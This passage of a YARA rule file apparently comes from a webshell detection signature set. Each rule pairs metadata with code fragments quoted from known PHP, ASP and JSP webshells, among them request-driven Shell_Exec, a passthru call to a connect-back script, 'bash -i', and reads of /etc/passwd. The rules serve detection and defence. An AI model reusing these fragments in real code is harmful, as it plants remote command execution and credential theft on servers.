		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6405-L6419"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3dd4f25bd132beb59d2ae0c813373c9ea20e1b7a"
		logic_hash = "9d320eed18a5d76a87cee4ea0fa9caf08f096f7eeaab55420540aa082b596e0f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "header(\"Content-Length: \".filesize($_POST['downf']));" fullword
		$s5 = "if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump"
		$s6 = "write(\"#\\n#Server : \".getenv('SERVER_NAME').\"" fullword
		$s12 = "foreach(@file($_POST['passwd']) as $fed)echo $fed;" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Gamma_Web_Shell_2
{
	meta:
		description = "PHP Webshells Github Archive - file Gamma Web Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "43b4fc9f-8897-5553-8846-29d307efa885"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6435-L6449"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7ef773df7a2f221468cc8f7683e1ace6b1e8139a"
		logic_hash = "1de868c4948a95272d288aeba3ac38b84bf6b33ede6b3b600b32530c85586404"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
		$s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
		$s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
		$s20 = "my $command = $self->query('command');" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Aspydrv_2
{
	meta:
		description = "PHP Webshells Github Archive - file aspydrv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6450-L6465"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3d8996b625025dc549d73cdb3e5fa678ab35d32a"
		logic_hash = "314fd671b163b9904cc78cb3a5858f5b1e3dfae9d520d5ebc545a7abd922e9f7"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files"
		$s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
		$s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
		$s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
		$s20 = "' ---Copy Too Folder routine Start" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Jspwebshell_1_2_2_2
{
	meta:
		description = "PHP Webshells Github Archive - file JspWebshell 1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "659f5c7d-0a9c-554d-a0ad-e3bcb8c5a1e9"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6466-L6481"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "184fc72b51d1429c44a4c8de43081e00967cf86b"
		logic_hash = "41d937fce969a850a2e4e07eb168becc96a036317a78d620e812707be9466dfc"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
		$s4 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword
		$s15 = "endPoint=random1.getFilePointer();" fullword
		$s20 = "if (request.getParameter(\"command\") != null) {" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_G00Nshell_V1_3_2
{
	meta:
		description = "PHP Webshells Github Archive - file g00nshell-v1.3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "61a09576-7e62-5a30-a52c-492b81b96322"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6482-L6497"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "70fe072e120249c9e2f0a8e9019f984aea84a504"
		logic_hash = "2ecb3ce2aa43a99552fb26e610c35bdb04f4ff0dc75c867e4327d6e27eed0177"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s10 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword
		$s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];" fullword
		$s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword
		$s17 = "echo(\"<form method='GET' name='shell'>\");" fullword
		$s18 = "echo(\"<form method='post' action='?act=sql'>\");" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Winx_Shell_2_2
{
	meta:
		description = "PHP Webshells Github Archive - file WinX Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ebad4f2e-96c3-5cb7-b228-de3a6a39ae55"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_WinX_Shell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6498-L6514"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a94d65c168344ad9fa406d219bdf60150c02010e"
		logic_hash = "f953c297763e41d197ce186dc818b656951dfa8c855c5063fc4abb54eeefc7bb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "// It's simple shell for all Win OS." fullword
		$s5 = "//------- [netstat -an] and [ipconfig] and [tasklist] ------------" fullword
		$s6 = "<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>" fullword
		$s13 = "// Created by greenwood from n57" fullword
		$s20 = " if (is_uploaded_file($userfile)) {" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_PHANTASMA_2
{
	meta:
		description = "PHP Webshells Github Archive - file PHANTASMA.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b36a7dbb-7d40-5fca-8409-c8822298005c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6515-L6529"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cd12d42abf854cd34ff9e93a80d464620af6d75e"
		logic_hash = "355be62807182f9a53bac20a6dead8f0a3bee83b6bdc4566502c157f16076b9b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s12 = "\"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" ." fullword
		$s15 = "if ($portscan != \"\") {" fullword
		$s16 = "echo \"<br>Banner: $get <br><br>\";" fullword
		$s20 = "$dono = get_current_user( );" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Cw_2
{
	meta:
		description = "PHP Webshells Github Archive - file cw.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6530-L6546"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e65e0670ef6edf0a3581be6fe5ddeeffd22014bf"
		logic_hash = "52bfb14f4d5d3df787ce7782cbbee25ea1556758eed48e3001c8a3f35a541526"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "// Dump Database [pacucci.com]" fullword
		$s2 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword
		$s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword
		$s8 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='htt"
		$s14 = "$dump .= \"-- Cyber-Warrior.Org\\n\";" fullword
		$s20 = "if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Include_W_Shell_2
{
	meta:
		description = "PHP Webshells Github Archive - file php-include-w-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a80ca446-6612-51b4-99a7-8a8d8e6ee196"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6547-L6560"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1a7f4868691410830ad954360950e37c582b0292"
		logic_hash = "2be144060d4fdaee38214dc2eba80c2a6fd3699060d274e66356fd5a08c9be4b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
		$s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
		$s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Mysql_Tool_2
{
	meta:
		description = "PHP Webshells Github Archive - file mysql_tool.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a22a0a5c-a686-517e-b1f9-279edab0616b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6561-L6573"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c9cf8cafcd4e65d1b57fdee5eef98f0f2de74474"
		logic_hash = "611636b3fa9a3163574b18cf8eacebea9733a1ad381261387f79a532b003e8fd"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
		$s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Phpspy_Ver_2006_2
{
	meta:
		description = "PHP Webshells Github Archive - file PhpSpy Ver 2006.php"
		author = "Florian Roth (Nextron Systems)"
		id = "adbb1963-31c8-5540-a679-c75b1101c163"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6574-L6588"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "34a89e0ab896c3518d9a474b71ee636ca595625d"
		logic_hash = "69bd2c387b0e676168116f3b3c3c081e08fd555cc6bc9a94b9c8ef97f194b09f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword
		$s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
		$s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32"
		$s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Zyklonshell_2
{
	meta:
		description = "PHP Webshells Github Archive - file ZyklonShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4d7ff3e5-4940-52c8-b045-5db1523f70c2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6589-L6603"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3fa7e6f3566427196ac47551392e2386a038d61c"
		logic_hash = "5d49f2599781836156f6bbb0c50cfcffdb2ca51c7cb688abbc6245d7f856ad01"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
		$s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
		$s2 = "<TITLE>404 Not Found</TITLE>" fullword
		$s3 = "<H1>Not Found</H1>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Lolipop_2
{
	meta:
		description = "PHP Webshells Github Archive - file lolipop.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6620-L6633"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "86f23baabb90c93465e6851e40104ded5a5164cb"
		logic_hash = "8b0dcf76a244f80d4bee0c62189df55c1f8d71cf0900cd8ebb5916f5fe972bed"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "$commander = $_POST['commander']; " fullword
		$s9 = "$sourcego = $_POST['sourcego']; " fullword
		$s20 = "$result = mysql_query($loli12) or die (mysql_error()); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Simple_Cmd_2
{
	meta:
		description = "PHP Webshells Github Archive - file simple_cmd.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1fd0c01a-c265-5e30-ab36-e8e93e316fbe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6634-L6648"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "466a8caf03cdebe07aa16ad490e54744f82e32c2"
		logic_hash = "82a65f4bbdcd2fc626aa9f36fe530d19aa19a48389e970c26e525597818914ee"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s2 = "<title>G-Security Webshell</title>" fullword
		$s4 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s6 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Azrailphp_V1_0_2_2
{
	meta:
		description = "PHP Webshells Github Archive - file aZRaiLPhp v1.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "10546549-e16d-567d-9d88-3d37fe8ff03f"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_aZRaiLPhp_v1_0"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6665-L6680"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a2c609d1a8c8ba3d706d1d70bef69e63f239782b"
		logic_hash = "8309338bb327cc14ae5970bd921b3dba68353d55be31b9dbbc5374ded24ed563"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED"
		$s4 = "$fileperm=base_convert($_POST['fileperm'],8,10);" fullword
		$s19 = "touch (\"$path/$dismi\") or die(\"Dosya Olu" fullword
		$s20 = "echo \"<div align=left><a href='./$this_file?dir=$path/$file'>G" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Lostdc_2
{
	meta:
		description = "PHP Webshells Github Archive - file lostDC.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6709-L6724"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d54fe07ea53a8929620c50e3a3f8fb69fdeb1cde"
		logic_hash = "e3cd28f4a72f5a8a92c728fe76a7159c28256e87daf4c1dd10190a57263f5b45"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$info .= '[~]Server: ' .$_SERVER['HTTP_HOST'] .'<br />';" fullword
		$s4 = "header ( \"Content-Description: Download manager\" );" fullword
		$s5 = "print \"<center>[ Generation time: \".round(getTime()-startTime,4).\" second"
		$s9 = "if (mkdir($_POST['dir'], 0777) == false) {" fullword
		$s12 = "$ret = shellexec($command);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Casus_1_5_2
{
	meta:
		description = "PHP Webshells Github Archive - file CasuS 1.5.php"
		author = "Florian Roth (Nextron Systems)"
		id = "cf89d8f8-d498-57fe-98eb-a98350db182f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6725-L6738"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7eee8882ad9b940407acc0146db018c302696341"
		logic_hash = "0dbaa39bd33047d24e5bc9716108c5581da3f54e93d90f9c550b3d84de1ebfe2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "<font size='+1'color='#0000FF'><u>CasuS 1.5'in URL'si</u>: http://$HTTP_HO"
		$s8 = "$fonk_kap = get_cfg_var(\"fonksiyonlary_kapat\");" fullword
		$s18 = "if (file_exists(\"F:\\\\\")){" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Ftpsearch_2
{
	meta:
		description = "PHP Webshells Github Archive - file ftpsearch.php"
		author = "Florian Roth (Nextron Systems)"
		id = "9db8f00a-1843-5057-b8c7-a7f7b63e0659"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6739-L6753"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c945f597552ccb8c0309ad6d2831c8cabdf4e2d6"
		logic_hash = "6b32553be4fdf26776e3cbb8a5d4d011d88f2bd50949b65934df72b89065aeec"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "echo \"[-] Error : coudn't read /etc/passwd\";" fullword
		$s9 = "@$ftp=ftp_connect('127.0.0.1');" fullword
		$s12 = "echo \"<title>Edited By KingDefacer</title><body>\";" fullword
		$s19 = "echo \"[+] Founded \".sizeof($users).\" entrys in /etc/passwd\\n\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Cyber_Shell_Cybershell_Cyber_Shell__V_1_0__2
{
	meta:
		description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php"
		author = "Florian Roth (Nextron Systems)"
		id = "79146f25-87b9-5216-af88-4e433bb08b90"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6754-L6771"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "fc2cf9a25ccc5aa3d9dc287ef9600b065ba9025cfb0a1ccca1bce9120ea03ff4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
		hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
		hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"

	strings:
		$s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</"
		$s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh"
		$s11 = " *   Coded by Pixcher" fullword
		$s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Ajax_PHP_Command_Shell_Ajax_PHP_Command_Shell_Soldierofallah_2
{
	meta:
		description = "PHP Webshells Github Archive - from files Ajax_PHP Command Shell.php, Ajax_PHP_Command_Shell.php, soldierofallah.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a158d158-d48d-514c-8b7b-4b6a4a10d021"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6772-L6792"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0b9e0d96c8a618a4883235e8c5c9a03a1e0b586cb4b30e0273e24c35ee5ee502"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "fa11deaee821ca3de7ad1caafa2a585ee1bc8d82"
		hash1 = "c0a4ba3e834fb63e0a220a43caaf55c654f97429"
		hash2 = "16fa789b20409c1f2ffec74484a30d0491904064"

	strings:
		$s1 = "'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\"," fullword
		$s2 = "'Running processes' => \"runcommand('ps -aux','GET')\"," fullword
		$s3 = "$dt = $_POST['filecontent'];" fullword
		$s4 = "'Open ports' => \"runcommand('netstat -an | grep -i listen','GET')\"," fullword
		$s6 = "print \"Sorry, none of the command functions works.\";" fullword
		$s11 = "document.cmdform.command.value='';" fullword
		$s12 = "elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST"

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_7_2
{
	meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "506373d6-31b4-5a14-b009-f2b43028a98b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6793-L6811"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "9d9b6b1333f2061c357fad110b5cc508288c70aea1212aa2fcbf283a2ce4fb2c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "de98f890790756f226f597489844eb3e53a867a9"
		hash1 = "128988c8ef5294d51c908690d27f69dffad4e42e"
		hash2 = "fd64f2bf77df8bcf4d161ec125fa5c3695fe1267"
		hash3 = "715f17e286416724e90113feab914c707a26d456"

	strings:
		$s0 = "header(\"Content-disposition: filename=$filename.sql\");" fullword
		$s1 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword
		$s2 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword
		$s4 = "if( $action == \"dumpTable\" )" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell__Small_Web_Shell_By_Zaco_Small_Zaco_Zacosmall_2
{
	meta:
		description = "PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php"
		author = "Florian Roth (Nextron Systems)"
		id = "99dbcea6-7208-5bbe-b200-9ea3074d7855"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6812-L6830"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "840c58043e39014e90e7621c1d2417d5a970c744560738abc4fea3db3cbb8d5a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b148ead15d34a55771894424ace2a92983351dda"
		hash1 = "e4ba288f6d46dc77b403adf7d411a280601c635b"
		hash2 = "e5713d6d231c844011e9a74175a77e8eb835c856"
		hash3 = "1b836517164c18caf2c92ee2a06c645e26936a0c"

	strings:
		$s2 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword
		$s4 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword
		$s6 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword
		$s20 = "echo('Dump for '.$db_dump.' now in '.$to_file);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Generic_PHP_8_2
{
	meta:
		description = "PHP Webshells Github Archive"
		author = "Florian Roth (Nextron Systems)"
		id = "40c6f69f-9963-5e4f-af44-041d47738519"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6831-L6850"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "346df2686c4d43b3210b07a30845477e057602500e67baba69b50c41e8d501fa"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "fc1ae242b926d70e32cdb08bbe92628bc5bd7f99"
		hash1 = "9ad55629c4576e5a31dd845012d13a08f1c1f14e"
		hash2 = "c4aa2cf665c784553740c3702c3bfcb5d7af65a3"

	strings:
		$s1 = "elseif ( $cmd==\"file\" ) { /* <!-- View a file in text --> */" fullword
		$s2 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
		$s3 = "/* I added this to ensure the script will run correctly..." fullword
		$s14 = "<!--    </form>   -->" fullword
